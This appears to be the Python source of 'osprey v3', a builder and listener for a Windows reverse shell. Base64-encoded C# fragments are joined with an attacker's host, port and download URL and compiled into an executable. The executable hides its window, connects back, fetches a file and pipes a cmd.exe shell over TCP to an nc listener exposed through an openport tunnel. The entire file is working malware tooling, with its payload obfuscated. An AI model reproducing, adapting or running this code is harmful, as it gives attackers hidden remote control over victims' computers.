import base64
import subprocess
import datetime
import os
import sys
import random
import time
import threading

def get_programs():
    try:
        print ("\u001b[34msetting up required programs\u001b[0m")
        try:
            os.mkdir("/etc/osprey/")
        except:
            pass
        try:
            os.mkdir("debug")
        except:
            pass
        os.system("sudo apt install mono-mcs -y")
        os.system("wget https://openport.io/download/debian64/latest.deb -O /etc/osprey/openport.deb")
        os.system("sudo dpkg -i /etc/osprey/openport.deb")
        print ("\u001b[32m[OK]\u001b[0m	")
    except:
        print ("\u001b[31mERROR: exiting...")
        sys.exit()

def openport_startup():
    print ("\u001b[34msetting up networking\u001b[0m")
    def c1():
        time.sleep(15)
        os.system("pkill openport")
    def c2():
        os.system("openport 7823 > out.txt")

    t1 = threading.Thread(target=c1, args=())
    t2 = threading.Thread(target=c2, args=())
    t1.start()
    t2.start()
    time.sleep(20)
    print ("\u001b[32m[OK]\u001b[0m ")


def make_usr_config():
        time.sleep(5)
        print ("\u001b[34msetting user configuration files\u001b[0m")
        for ln in open("out.txt").read().split("\n"):
            if "Now forwarding remote port" in ln:
                rhost = ln.split()[6].split(":")[0]
                rport = ln.split()[6].split(":")[1]
                lport = ln.split()[8].split(":")[1].split(".")[0]
            elif "Tell the one you are sending this link to, to first go here" in ln:
                url = ln.split()[13]
        
        open("/etc/osprey/url.txt","w").write(url)
        open("/etc/osprey/rhost.txt","w").write(rhost)
        open("/etc/osprey/rport.txt","w").write(rport)
        open("/etc/osprey/lport.txt","w").write(lport)
        print ("\u001b[32m[OK]\u001b[0m ")

def setup():
	print ("""
IT LOOKS LIKE THIS IS YOUR FIRST TIME RUNNING THE LATEST VERSION OF OSPREY
WE NEED TO SET UP A FIEW THINGS
THIS MIGHT TAKE A FIEW MINUTES
""")
	get_programs()
	openport_startup()
	make_usr_config()
	print ("""
OK, SO IT LOOKS LIKE THE SETUP WORKED
GO AHEAD AND RUN THE PROGRAM AGAIN AND YOU SOULDNT GET ANYMORE ANOYING MESSAGES
IF YOU HAVE ANY ISSUES MAKE SURE TO LET ME KNOW ON GITHUB, OR JUST MESSAGE ME ON DISCORD:  9sec#7640
""")
	sys.exit()



def build(OUT,HOST,PORT,URL):
    pld_sect1 = str(base64.b64decode("dXNpbmcgU3lzdGVtOwp1c2luZyBTeXN0ZW0uVGV4dDsKdXNpbmcgU3lzdGVtLklPOwp1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3M7CnVzaW5nIFN5c3RlbS5Db21wb25lbnRNb2RlbDsKdXNpbmcgU3lzdGVtLkxpbnE7CnVzaW5nIFN5c3RlbS5OZXQ7CnVzaW5nIFN5c3RlbS5OZXQuU29ja2V0czsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwoKbmFtZXNwYWNlIENvbm5lY3RCYWNrCnsKICAgICAgICBwdWJsaWMgY2xhc3MgUHJvZ3JhbQogICAgICAgIHsKICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyLmRsbCIpXQogICAgICAgICAgICAgICAgc3RhdGljIGV4dGVybiBJbnRQdHIgR2V0Q29uc29sZVdpbmRvdygpOwoKICAgICAgICAgICAgICAgIFtEbGxJbXBvcnQoInVzZXIzMi5kbGwiKV0KICAgICAgICAgICAgICAgIHN0YXRpYyBleHRlcm4gYm9vbCBTaG93V2luZG93KEludFB0ciBoV25kLCBpbnQgbkNtZFNob3cpOwoKICAgICAgICAgICAgICAgIGNvbnN0IGludCBTV19ISURFID0gMDsKCiAgICAgICAgICAgICAgICBzdGF0aWMgU3RyZWFtV3JpdGVyIHN0cmVhbVdyaXRlcjsKCiAgICAgICAgICAgICAgICBwdWJsaWMgc3RhdGljIHZvaWQgTWFpbihzdHJpbmdbXSBhcmdzKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgaGFuZGxlID0gR2V0Q29uc29sZVdpbmRvdygpOwogICAgICAgICAgICAgICAgICAgICAgICBTaG93V2luZG93KGhhbmRsZSwgU1dfSElERSk7CiAgICAgICAgICAgICAgICAgICAgICAgIHVzaW5nKFRjcENsaWVudCBjbGllbnQgPSBuZXcgVGNwQ2xpZW50KCI=".encode('utf-8')).decode())
    pld_sect2 = str(base64.b64decode("Iiwg".encode('utf-8')).decode())
    pld_sect3 = str(base64.b64decode("KSkKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHVzaW5nKFN0cmVhbSBzdHJlYW0gPSBjbGllbnQuR2V0U3RyZWFtKCkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdXNpbmcoU3RyZWFtUmVhZGVyIHJkciA9IG5ldyBTdHJlYW1SZWFkZXIoc3RyZWFtKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RyaW5nIGVuY29kZWRTdHJpbmcgPSAiWTIxa0xtVjRaUT09IjsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYnl0ZVtdIGRhdGEgPSBDb252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoZW5jb2RlZFN0cmluZyk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmluZyBkZWNvZGVkU3RyaW5nID0gRW5jb2RpbmcuVVRGOC5HZXRTdHJpbmcoZGF0YSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cmVhbVdyaXRlciA9IG5ldyBTdHJlYW1Xcml0ZXIoc3RyZWFtKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgU3RyaW5nQnVpbGRlciBzdHJJbnB1dCA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFdlYkNsaWVudCBkbGRjbGllbnQgPSBuZXcgV2ViQ2xpZW50KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRsZGNsaWVudC5Eb3dubG9hZEZpbGUoIg==".encode('utf-8')).decode())
    pld_sect4 = str(base64.b64decode("IiwgIm91dDUudHh0Iik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFByb2Nlc3MgcCA9IG5ldyBQcm9jZXNzKCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLkZpbGVOYW1lID0gZGVjb2RlZFN0cmluZzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5TdGFydEluZm8uQ3JlYXRlTm9XaW5kb3cgPSB0cnVlOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLlN0YXJ0SW5mby5Vc2VTaGVsbEV4ZWN1dGUgPSBmYWxzZTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5TdGFydEluZm8uUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRJbnB1dCA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuU3RhcnRJbmZvLlJlZGlyZWN0U3RhbmRhcmRFcnJvciA9IHRydWU7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuT3V0cHV0RGF0YVJlY2VpdmVkICs9IG5ldyBEYXRhUmVjZWl2ZWRFdmVudEhhbmRsZXIoQ21kT3V0cHV0RGF0YUhhbmRsZXIpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwLlN0YXJ0KCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHAuQmVnaW5PdXRwdXRSZWFkTGluZSgpOwoKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgd2hpbGUodHJ1ZSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0cklucHV0LkFwcGVuZChyZHIuUmVhZExpbmUoKSk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy9zdHJJbnB1dC5BcHBlbmQoIlxuIik7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcC5TdGFuZGFyZElucHV0LldyaXRlTGluZShzdHJJbnB1dCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgc3RySW5wdXQuUmVtb3ZlKDAsIHN0cklucHV0Lkxlbmd0aCk7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBwcml2YXRlIHN0YXRpYyB2b2lkIENtZE91dHB1dERhdGFIYW5kbGVyKG9iamVjdCBzZW5kaW5nUHJvY2VzcywgRGF0YVJlY2VpdmVkRXZlbnRBcmdzIG91dExpbmUpCiAgICAgICAgewogICAgICAgICAgICBTdHJpbmdCdWlsZGVyIHN0ck91dHB1dCA9IG5ldyBTdHJpbmdCdWlsZGVyKCk7CgogICAgICAgICAgICBpZiAoIVN0cmluZy5Jc051bGxPckVtcHR5KG91dExpbmUuRGF0YSkpCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIHRyeQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHN0ck91dHB1dC5BcHBlbmQob3V0TGluZS5EYXRhKTsKICAgICAgICAgICAgICAgICAgICBzdHJlYW1Xcml0ZXIuV3JpdGVMaW5lKHN0ck91dHB1dCk7CiAgICAgICAgICAgICAgICAgICAgc3RyZWFtV3JpdGVyLkZsdXNoKCk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaCAoRXhjZXB0aW9uKSB7fQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQp9".encode('utf-8')).decode())
    pld = (pld_sect1 + HOST + pld_sect2 + PORT + pld_sect3 + URL + pld_sect4)
    try:
        os.mkdir("bld")
    except:
        pass
    try:
        os.mkdir("debug")
    except:
        pass
    o = open("bld/out.cs","w+")
    o.write(pld)
    o.close()
    os.system("mcs bld/out.cs")
    now = datetime.datetime.now()
    os.system("cp bld/out.cs debug/{}_{}_{}_{}_{}.cs".format(now.year, now.month, now.day, now.hour, now.minute))
    os.system("cp bld/out.exe {}".format(OUT))
    os.system("rm -r bld")

def server(PORT):
    def c1():
        time.sleep(15)
        os.system(f"nc -lvvp {PORT}")
    def c2():
        os.system(f"openport {PORT}")

    t1 = threading.Thread(target=c1, args=())
    t2 = threading.Thread(target=c2, args=())
    t1.start()
    t2.start()

def cfg():
	if os.path.exists("/etc/osprey/"):
		now = datetime.datetime.now()
		print ("\u001b[32m[FOUND A CONFIGURATION DIRECTORY]\u001b[0m ")
		time.sleep(5)
	else:
		setup()

def main():
	os.system("clear")
	cfg()
	print("""
                                  _____ 
                                 |____ |
  ___  ___ _ __  _ __ ___ _   _      / /
 / _ \/ __| '_ \| '__/ _ \ | | |     \ \    
| (_) \__ \ |_) | | |  __/ |_| | .___/ /
 \___/|___/ .__/|_|  \___|\__, | \____/ 
          | |              __/ |        
          |_|             |___/         
    https://github.com/9-s3c/osprey-v3/
""")
	f1 = open("/etc/osprey/rhost.txt","r")
	rhost = f1.read().rstrip()
	f1.close()
	f2 = open("/etc/osprey/rport.txt","r")
	rport = f2.read().rstrip()
	f2.close()
	f3 = open("/etc/osprey/lport.txt","r")
	lport = f3.read().rstrip()
	f3.close()
	url = open("/etc/osprey/url.txt","r").read().rstrip()
	chs = input("\n\n\nosprey debug, 3.0\n\nBuild\t\t[B]\nListener\t[L]\nSetup\t\t[S]\n\noption: ")
	if chs.lower() == "b":
		build(input("payload_name(example.exe): "),rhost,rport,url)
	else:
		server(lport)

main()
